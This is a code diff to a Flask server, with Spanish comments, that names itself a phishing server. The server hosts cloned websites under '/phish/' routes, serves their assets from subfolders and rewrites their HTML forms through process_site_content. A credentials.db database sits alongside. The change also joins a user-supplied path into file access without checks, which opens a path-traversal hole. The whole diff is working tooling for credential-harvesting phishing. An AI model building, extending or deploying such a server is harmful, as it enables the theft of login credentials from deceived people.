@@ -24,7 +24,7 @@ app.secret_key = 'phishing_server_professional_2024'
 SITES_DIR = 'sites'
 LOGOS_DIR = 'logos'
 CREDENTIALS_DB = 'credentials.db'
-STATIC_FILES = ['css', 'js', 'png', 'jpg', 'jpeg', 'gif', 'svg', 'ico', 'woff', 'woff2', 'ttf', 'eot']
+STATIC_FILES = ['css', 'js', 'png', 'jpg', 'jpeg', 'gif', 'svg', 'ico', 'woff', 'woff2', 'ttf', 'eot', 'json', 'xml', 'txt']
 deployed_sites = set()  # Sitios actualmente desplegados
 
 # Lock para thread safety
@@ -170,9 +170,9 @@ def serve_phishing_site_root(site_name):
     
     return f"Sitio {site_name} sin contenido disponible", 404
 
-@app.route('/phish/<site_name>/<filename>')
+@app.route('/phish/<site_name>/<path:filename>')
 def serve_phishing_file(site_name, filename):
-    """Sirve archivos específicos del sitio de phishing"""
+    """Sirve archivos específicos del sitio de phishing (incluyendo subcarpetas)"""
     if site_name not in deployed_sites:
         return redirect(url_for('deploy_site', site_name=site_name))
     
@@ -182,19 +182,34 @@ def serve_phishing_file(site_name, filename):
     if not os.path.exists(file_path):
         return f"Archivo '{filename}' no encontrado", 404
     
-    # Archivos estáticos
-    file_ext = filename.split('.')[-1].lower()
+    # Archivos estáticos (incluyendo subcarpetas)
+    file_ext = filename.split('.')[-1].lower() if '.' in filename else ''
     if file_ext in STATIC_FILES:
-        return send_from_directory(site_path, filename)
+        # Para archivos en subcarpetas, usar send_from_directory con el directorio padre
+        directory = os.path.dirname(file_path)
+        file_name = os.path.basename(file_path)
+        return send_from_directory(directory, file_name)
     
-    # Archivos HTML/PHP
+    # Archivos HTML/PHP/CSS/JS
     try:
         with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read()
         
-        # Procesar contenido para actualizar formularios
-        content = process_site_content(content, site_name)
-        return content, 200, {'Content-Type': 'text/html; charset=utf-8'}
+        # Procesar contenido para actualizar formularios solo en HTML/PHP
+        if filename.endswith(('.html', '.php')):
+            content = process_site_content(content, site_name)
+        
+        # Determinar content type
+        content_types = {
+            'html': 'text/html; charset=utf-8',
+            'php': 'text/html; charset=utf-8',
+            'css': 'text/css; charset=utf-8',
+            'js': 'application/javascript; charset=utf-8',
+            'json': 'application/json; charset=utf-8'
+        }
+        
+        content_type = content_types.get(file_ext, 'text/plain; charset=utf-8')
+        return content, 200, {'Content-Type': content_type}
     
     except Exception as e:
         return f"Error al cargar archivo: {str(e)}", 500
